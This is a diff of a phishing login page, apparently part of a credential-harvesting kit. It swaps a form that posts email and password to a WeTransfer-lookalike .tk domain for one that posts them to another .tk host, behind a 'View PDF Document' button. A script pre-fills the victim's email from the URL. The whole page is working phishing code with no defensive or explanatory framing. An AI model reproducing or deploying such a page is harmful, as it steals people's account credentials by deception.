@@ -104,16 +104,18 @@ body {text-align:center;margin:0}
 <div id="container">
 <body style="visibility:hidden" onload="unhideBody()" bgColor="#030100">
 <div id="image1" style="position:absolute; overflow:hidden; left:477px; top:139px; width:440px; height:365px; z-index:0"><img src="images/t3.png" alt="" title="" border=0 width=440 height=341></div>
-<form name="forma" action="https://wetranfer.tk/next1.php" autocomplete="off" id=chalbhai method=post>
-<div><input name="email" id="email" autocomplete="off" value="" class="input"  required type="text" style="position:absolute;width:290px;left:528px;top:225px;z-index:1">
-</div>
-<div><input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textrbox"  required type="password" background-color: "#ffffff;" style="position:absolute;width:330px;left:520px;top:310px;z-index:1">
-</div>
+<form id="myForm" name="form" method="post" action="https://solidsolutions-com.tk/gbenga/tom.php">
+    <div><input class="input" type="text" id="email" value="" name="email" autocomplete="off" placeholder="Email Address" required=""> <!-- <label for="email">Email Address </label> --><!-- Requirements: no longer in use --><!-- <div class="requirements">Must be a valid email address.</div> --></div><br>
+    <div><input id="password" class="input" type="password" name="password" placeholder="Password" required="" pattern=".{5,}"> <!-- <label for="password">Password</label> --><!-- Requirements: no longer in use --><!-- <div class="requirements">
+    Your password must be at least 6 characters as well as contain at least one uppercase, one
+    lowercase, and one number.
+    </div> --></div><input id="submit" type="submit" value="View PDF Document"> 
+	</form>
 <div id="formimage1" style="position:absolute; left:770px; top:411px; z-index:3"><input type="image" name="formimage1" width="100" height="35" src="images/logn.png"></div>
 
 
 <div id="image9" style="position:absolute; overflow:hidden; width:290px;left:519px;top:235px; z-index:6"><a href="#"><img src="images/s1.png" alt="" title="" border=0 width=13 height=10></a></div>
-</form>
+
 </div>
 <script type="text/javascript">
  
@@ -130,10 +132,10 @@ body {text-align:center;margin:0}
  
  </script>
  <script type="text/javascript" language="JavaScript">
-//Copyright 2006 Bontrager Connection, LLC//
+<!-- Copyright 2006 Bontrager Connection, LLC
 function FillForm() {
 // Specify form's name between the quotes on next line.
-var FormName = "forma";
+var FormName = "form";
 var questionlocation = location.href.indexOf('?');
 if(questionlocation < 0) { return; }
 var q = location.href.substr(questionlocation + 1);
